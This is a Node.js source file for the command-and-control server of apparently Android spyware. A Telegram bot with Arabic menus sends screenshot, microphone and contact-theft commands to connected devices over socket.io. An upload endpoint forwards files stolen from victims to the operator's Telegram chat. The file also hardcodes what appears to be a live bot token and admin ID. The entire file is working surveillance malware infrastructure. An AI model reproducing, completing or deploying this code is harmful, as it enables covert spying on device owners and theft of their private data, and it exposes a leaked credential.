const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const multer = require('multer');
const fs = require('fs');

const TOKEN = '8910918204:AAHdGkvLbJKbHspDW25d4OPEPL0P0jHudkA';
const ADMIN_ID = 7294984974;

const bot = new TelegramBot(TOKEN, { polling: true, request: { timeout: 30000 } });
const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const appData = new Map();

app.post('/upload', uploader.single('file'), (req, res) => {
    if (!req.file) return res.status(400).send('No file');
    bot.sendDocument(ADMIN_ID, req.file.buffer, { caption: 'ملف مستلم' });
    res.send('Done');
});

io.on('connection', socket => {
    let deviceId = socket.handshake.headers['user-agent'] + '-' + socket.id;
    bot.sendMessage(ADMIN_ID, `جهاز متصل\n\n${deviceId}`);
    socket.on('disconnect', () => { bot.sendMessage(ADMIN_ID, `جهاز انقطع`); });
    socket.on('log', msg => { bot.sendMessage(ADMIN_ID, `رسالة: ${msg}`); });
});

bot.on('message', msg => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const target = appData.get('target');

    if (text === '/start') {
        bot.sendMessage(chatId, 'مرحبا بك:', { reply_markup: { keyboard: [['الأجهزة', 'الجميع']], resize_keyboard: true } });
        return;
    }
    if (text === 'الأجهزة') {
        if (io.sockets.sockets.size === 0) return bot.sendMessage(chatId, 'لا يوجد أجهزة');
        let m = '';
        io.sockets.sockets.forEach((s) => { m += `ID: ${s.id}\n`; });
        bot.sendMessage(chatId, m);
        return;
    }
    if (text === 'الجميع') {
        appData.set('target', 'all');
        bot.sendMessage(chatId, 'اختر:', { reply_markup: { keyboard: [['لقطة', 'مايك', 'جهات']], resize_keyboard: true } });
        return;
    }
    const commands = { 'لقطة': 'screenshot', 'مايك': 'microphone', 'جهات': 'contacts' };
    if (commands[text]) {
        const payload = { request: commands[text], extras: [] };
        if (target === 'all') io.emit('commend', payload);
        else io.to(target).emit('commend', payload);
        appData.delete('target');
        bot.sendMessage(chatId, `تم إرسال: ${text}`);
        return;
    }
});

server.listen(process.env.PORT || 3000, () => console.log('Server running'));
